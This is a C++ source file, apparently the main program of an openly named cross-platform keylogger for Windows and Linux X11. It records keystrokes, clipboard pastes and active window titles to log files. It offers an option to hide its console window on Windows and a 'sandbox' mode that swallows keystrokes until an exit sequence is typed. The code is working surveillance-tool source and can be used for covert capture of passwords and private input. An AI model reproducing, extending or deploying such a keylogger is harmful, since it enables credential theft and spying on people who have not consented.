#include "FileLogger.h"
#include "SandboxListener.h"
#include "StdoutLogger.h"

#ifdef _WIN32
    #include "KeycodeMapperEnUs.h"

    #include "ClipboardHandlerWindows.h"
    #include "KeystrokeCapturerWindows.h"
    #include "WindowHandlerWindows.h"
#elif defined(__linux__)
    #include "KeycodeMapperEnUsX11.h"

    #include "ClipboardHandlerLinuxX11.h"
    #include "KeystrokeCapturerLinuxX11.h"
    #include "WindowHandlerLinuxX11.h"

    #include <X11/Xlib.h>
#endif

#include "getopt.h"

#include <chrono>
#include <iostream>
#include <thread>

#ifdef _WIN32
    #include <windows.h>
#else
    #include <unistd.h>
#endif

Keylogger::IKeycodeMapper* getMapperByStr(std::string mapper) {
    if (mapper == "en-us") {
    #ifdef __linux__
        return new Keylogger::KeycodeMapperEnUsX11();
    #else
        return new Keylogger::KeycodeMapperEnUs();
    #endif
    }
    return nullptr;
}

void sleep_ms(unsigned int ms) {
    std::this_thread::sleep_for(std::chrono::milliseconds(ms));
}

void hideConsole() {
#ifdef _WIN32
    ShowWindow(GetConsoleWindow(), SW_HIDE);
#endif
}

void printSandboxState(Keylogger::SandboxListener* sandbox) {
    while (true) {
        std::cout << std::endl << "Type '" << sandbox->getExitSeq(true) << "' to exit the sandbox." << std::endl;
        sleep_ms(1000);
    }
}

int main(int argc, char *argv[]) {
    const char* const short_opts = "chkm:o:swz";
    const option long_opts[] = {
        {"clipboard", no_argument, nullptr, 'c'},
        {"help", no_argument, nullptr, 'h'},
        {"hidden", no_argument, nullptr, 'z'},
        {"keycodes", no_argument, nullptr, 'k'},
        {"mapper", required_argument, nullptr, 'm'},
        {"output", required_argument, nullptr, 'o'},
        {"sandbox", no_argument, nullptr, 's'},
        {"window", no_argument, nullptr, 'w'},
        {nullptr, no_argument, nullptr, 0}
    };

    const char help[] = "\
options:\n\
  -c, --clipboard        enable clipboard paste logging\n\
  -h, --help             shows this help menu\n\
  -k, --keycodes         log keycodes pressed/released\n\
  -m, --mapper [name]    use this keycode mapper (default 'en-us')\n\
  -o, --output [file]    output to this file\n\
  -s, --sandbox          capture key presses without passing them through\n\
                           until the correct sequence is typed, then exit\n\
  -w, --window           enable window name logging\n\
  -z, --hidden           hide the console window\n\
\n\
available keycode maps:\n\
  en-us    US keyboard\n\
";

    srand(time(0));

    Keylogger::IKeycodeMapper* mapper = getMapperByStr("en-us");
    std::string logName = "log";

    bool clipboardEnable = false;
    bool keycodesLog = false;
    bool windowEnable = false;
    bool sandbox = false;

    int opt;
    while ((opt = getopt_long(argc, argv, short_opts, long_opts, nullptr)) != -1) {
        switch (opt) {
        case 'c':
            clipboardEnable = true;
            break;
        case 'k':
            keycodesLog = true;
            break;
        case 'm':
            delete mapper;
            mapper = getMapperByStr(optarg);
            if (mapper == nullptr) {
                std::cout << "error: unknown keycode map." << std::endl << std::endl;
                std::cout << help;
                return 1;
            }
            break;
        case 'o':
            logName = std::string(optarg);
            break;
        case 's':
            sandbox = true;
            break;
        case 'w':
            windowEnable = true;
            break;
        case 'z':
            hideConsole();
            break;
        case 'h':
        case '?':
        default:
            std::cout << help;
            return 1;
        }
    }

    Keylogger::IClipboardHandler* clipboard = nullptr;
    Keylogger::IKeystrokeCapturer* capturer = nullptr;
    Keylogger::IWindowHandler* window = nullptr;

    Keylogger::FileLogger loggerBin;
    Keylogger::FileLogger logger;
    Keylogger::StdoutLogger loggerStdout;

#ifdef _WIN32
    clipboard = new Keylogger::ClipboardHandlerWindows();
    capturer = new Keylogger::KeystrokeCapturerWindows();
    window = new Keylogger::WindowHandlerWindows();
#elif __linux__
    XInitThreads();
    clipboard = new Keylogger::ClipboardHandlerLinuxX11();
    capturer = new Keylogger::KeystrokeCapturerLinuxX11();
    window = new Keylogger::WindowHandlerLinuxX11();
#endif

    if (keycodesLog) {
        loggerBin.open(
            nullptr,
            clipboardEnable ? clipboard : nullptr,
            windowEnable ? window : nullptr,
            logName + ".bin"
        );
        capturer->addLogger(&loggerBin);
    }

    logger.open(
        mapper,
        clipboardEnable ? clipboard : nullptr,
        windowEnable ? window : nullptr,
        logName + ".txt"
    );
    capturer->addLogger(&logger);

    capturer->start();
    capturer->consumeKeystrokes(sandbox);

    Keylogger::SandboxListener sandboxListener;
    std::thread* thr;

    if (sandbox) {
        loggerStdout.open(mapper);
        capturer->addLogger(&loggerStdout);

        sandboxListener.start(mapper);
        thr = new std::thread(printSandboxState, &sandboxListener);
        capturer->setCallback([&sandboxListener](int keycode, Keylogger::KeyState state) {
            if (state == Keylogger::KeyState::Pressed) {
                if (sandboxListener.keycodeSent(keycode)) {
                    exit(0);
                }
            }
        });
    }

#ifdef _WIN32
    MSG msg;
    while (!GetMessage(&msg, NULL, NULL, NULL)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
#else
    while (true) {
        sleep_ms(100);
    }
#endif

    capturer->stop();
    return 0;
}
